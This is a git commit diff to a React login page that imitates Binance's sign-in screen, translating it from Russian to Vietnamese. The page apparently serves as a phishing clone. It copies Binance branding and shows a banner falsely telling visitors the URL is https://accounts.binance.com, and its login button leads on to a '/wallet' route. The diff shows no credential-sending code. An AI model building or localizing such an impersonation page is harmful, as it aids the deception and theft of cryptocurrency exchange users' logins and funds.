d04edee7a23925d5d71f0d1f7e4cf6162d8b7f23
Minhlc997 <Mle20468@gmail.com>
2025-03-16 14:49:52 +0700

    Update LoginPage.jsx

--- src/pages/LoginPage.jsx
+++ src/pages/LoginPage.jsx
@@ -8,7 +8,7 @@ import { Link } from 'react-router-dom';
 const LoginPage = () => {
   return (
     <div className="flex flex-col items-center justify- min-h-screen bg-binanceBackground">
-      <div className="w-full max-w-lg px-4  py-8 space-y-8 bg-binanceBackground rounded-lg shadow-md">
+      <div className="w-full max-w-lg px-4 py-8 space-y-8 bg-binanceBackground rounded-lg shadow-md">
         <div className="flex items-center justify-between mb-4">
           <div className="flex items-center">
             <img src={binancelogo} alt="Binance Logo" className="h-8" />
@@ -20,78 +20,66 @@ const LoginPage = () => {
           </div>
         </div>
         <div className="bg-yellow-900 text-center text-white py-1 rounded">
-          Проверка URL: <span className="text-green-500">https://accounts.binance.com</span>
+          Kiểm tra URL: <span className="text-green-500">https://accounts.binance.com</span>
         </div>
-        <h2 className="mt-6 text-start text-3xl font-bold text-white">Войти</h2>
+        <h2 className="mt-6 text-start text-3xl font-bold text-white">Đăng nhập</h2>
         <form className="mt-8 space-y-6">
           <div className="rounded-md shadow-sm -space-y-px">
             <div>
-              <label htmlFor="email" className="block text-white">Эл. почта / Телефон</label>
+              <label htmlFor="email" className="block text-white">Email / Số điện thoại</label>
               <input
                 id="email"
                 name="email"
                 type="email"
                 autoComplete="email"
                 required
-                className="appearance-none rounded-none relative block w-full px-3 py-3 border border-gray-700 bg-binanceBackground placeholder-neutral-900 text-white rounded-t-md focus:outline-none focus:ring-yellow-500 focus:border-yellow-500 focus:z-10 sm:text-sm"
+                className="appearance-none rounded-none relative block w-full px-3 py-3 border border-gray-700 bg-binanceBackground placeholder-neutral-900 text-white rounded-t-md focus:outline-none"
                 placeholder=""
               />
             </div>
-            {/* <div className="mt-4">
-              <label htmlFor="phone" className="block text-white">Номер телефона</label>
-              <input
-                id="phone"
-                name="phone"
-                type="text"
-                autoComplete="tel"
-                required
-                className="appearance-none rounded-none relative block w-full px-3 py-3 border border-gray-300 bg-neutral-900 placeholder-neutral-900 text-white rounded-t-md focus:outline-none focus:ring-yellow-500 focus:border-yellow-500 focus:z-10 sm:text-sm"
-                placeholder=""
-              />
-            </div> */}
           </div>
           <div>
-          <Link to={'/wallet'}>
-            <button
-              type="submit"
-              className="group relative w-full flex justify-center py-3 px-4 border border-transparent text-md font-medium rounded-md text-black bg-yellow-500 hover:bg-yellow-600 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-yellow-500"
-            >
-              Далее
-            </button>
+            <Link to={'/wallet'}>
+              <button
+                type="submit"
+                className="group relative w-full flex justify-center py-3 px-4 border border-transparent text-md font-medium rounded-md text-black bg-yellow-500 hover:bg-yellow-600 focus:outline-none"
+              >
+                Đăng nhập
+              </button>
             </Link>
           </div>
           <div className="relative flex justify-center text-sm">
-            <span className="px-2 bg-gray-800 text-gray-400 rounded-sm">или</span>
+            <span className="px-2 bg-gray-800 text-gray-400 rounded-sm">hoặc</span>
           </div>
           <div className="flex flex-col space-y-3">
             <button
               type="button"
-              className="group relative w-full flex justify-center py-3 px-4 border border-gray-600 text-sm font-medium rounded-md text-gray-100 bg-gray-700 hover:bg-gray-800 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-gray-500"
+              className="group relative w-full flex justify-center py-3 px-4 border border-gray-600 text-sm font-medium rounded-md text-gray-100 bg-gray-700 hover:bg-gray-800 focus:outline-none"
             >
               <span className="absolute left-0 inset-y-0 flex items-center pl-3">
                 <img src={googlelogo} alt="Google" className="h-5 w-5" />
               </span>
-              Продолжить с Google
+              Tiếp tục với Google
             </button>
             <button
               type="button"
-              className="group relative w-full flex justify-center py-3 px-4 border border-gray-600 text-sm font-medium rounded-md text-gray-100 bg-gray-700 hover:bg-gray-800 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-gray-500"
+              className="group relative w-full flex justify-center py-3 px-4 border border-gray-600 text-sm font-medium rounded-md text-gray-100 bg-gray-700 hover:bg-gray-800 focus:outline-none"
             >
               <span className="absolute left-0 inset-y-0 flex items-center pl-3">
                 <img src={applelogo} alt="Apple" className="h-5 w-5" />
               </span>
-              Продолжить с Apple
+              Tiếp tục với Apple
             </button>
           </div>
           <div className="text-center">
             <a href="#" className="font-medium text-yellow-500 hover:text-yellow-400">
-              Создать аккаунт Binance
+              Tạo tài khoản Binance
             </a>
           </div>
         </form>
       </div>
       <div className="mt-6 text-gray-500 text-center">
-        Binance © 2024 • <a href="#" className="text-yellow-500 hover:text-yellow-400">Настройка cookie</a>
+        Binance © 2024 • <a href="#" className="text-yellow-500 hover:text-yellow-400">Cài đặt cookie</a>
       </div>
     </div>
   );
